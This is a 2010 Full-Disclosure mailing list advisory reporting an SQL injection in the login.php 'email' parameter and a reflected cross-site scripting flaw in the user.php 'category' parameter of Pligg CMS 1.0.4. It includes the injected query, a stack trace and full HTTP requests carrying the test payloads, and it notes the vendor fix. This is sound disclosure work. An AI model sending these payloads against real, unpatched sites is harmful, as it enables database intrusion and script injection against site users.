
Date: Fri, 03 Sep 2010 16:49:23 +0300
From: Bogdan Calin <bogdan@...netix.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Security vulnerabilities in Pligg CMS version
	1.0.4

While beta testing the latest version of Acunetix WVS v7, we found a
large number of security vulnerabilities in various web applications. In
the following days we will publish some of these vulnerabilities.  Note
that we will not publish vulnerabilities found in applications that are
not commonly used or in beta stage.

One of the tested web applications is Pligg:

Pligg is an open source CMS (Content Management System) that you can
download and use for free. Pligg CMS provides social publishing software
that encourages visitors to register on your website so that they can
submit content and connect with other users.

The following web vulnerabilities were found in Pligg CMS Version 1.0.4;

1. SQL injection in “/pliggcms_1_0_4/login.php“, parameter “email“.
2. Cross-site Scripting vulnerability in “/pliggcms_1_0_4/user.php“,
parameter “category“.

Technical details about each web vulnerability are below;

1. SQL injection in “/pliggcms_1_0_4/login.php“, parameter “email“.

Source file: /var/www/pliggcms_1_0_4/libs/db.php line: 222
Additional details:
SQL query:

SELECT * FROM `pligg_users` where `user_email` = '1ACUSTART'"*/rn
ACUEND' AND user_level!='Spammer'

Stack trace:
1. ezSQL_mysql::query([string] "SELECT * FROM `pligg_users` where
`user_email` = '1ACUSTART'"*/rn     ACUEND' AND user_level!='Spammer'")
2. ezSQLcore::get_row([string] "SELECT * FROM `pligg_users` where
`user_email` = '1ACUSTART'"*/rn     ACUEND' AND user_level!='Spammer'")

Same HTTP request:

POST /pliggcms_1_0_4/login.php HTTP/1.1
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect: enabled
Content-Length: 68
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=4c7d8e111f3ec5e90e664e26f365cc04; mnm_user=tmp;
mnm_key=dG1wOjIyZkpqa1BveUhCVFE6NWY1YTg5NTJkYzUzODI4NGYwOTA0Y2Q0NTUzNzk5NDE%3D;
template=wistie
Host: webapps7:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR
1.1.4322)

email=sql'injection&processlogin=3&return=%2fpliggcms_1_0_4%2f


2. Cross-site Scripting vulnerability in “/pliggcms_1_0_4/user.php”,
parameter “category”.

URL encoded GET input categorywas set to " onmouseover=prompt(938687) bad="

The input is reflected inside a tag element between double quotes.
The input is reflected inside a tag element between single quotes.

Sample HTTP request
POST
/pliggcms_1_0_4/user.php?category=%22%20onmouseover%3dprompt%28938687%29%20bad%3d%22&id=&keyword=Search..&login=&module=&page=&search=&view=search
HTTP/1.1
Content-Length: 9
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=4c7d8e111f3ec5e90e664e26f365cc04; mnm_user=tmp;
mnm_key=dG1wOjIyZkpqa1BveUhCVFE6NWY1YTg5NTJkYzUzODI4NGYwOTA0Y2Q0NTUzNzk5NDE%3D;
template=wistie
Host: webapps7:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR
1.1.4322)

username=

These vulnerabilities were reported to the Pligg team on 22/7/2010 via
the contact form from their website and they were fixed in latest
version of Pligg.  If you are using Pligg, download the latest version
from their website.

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
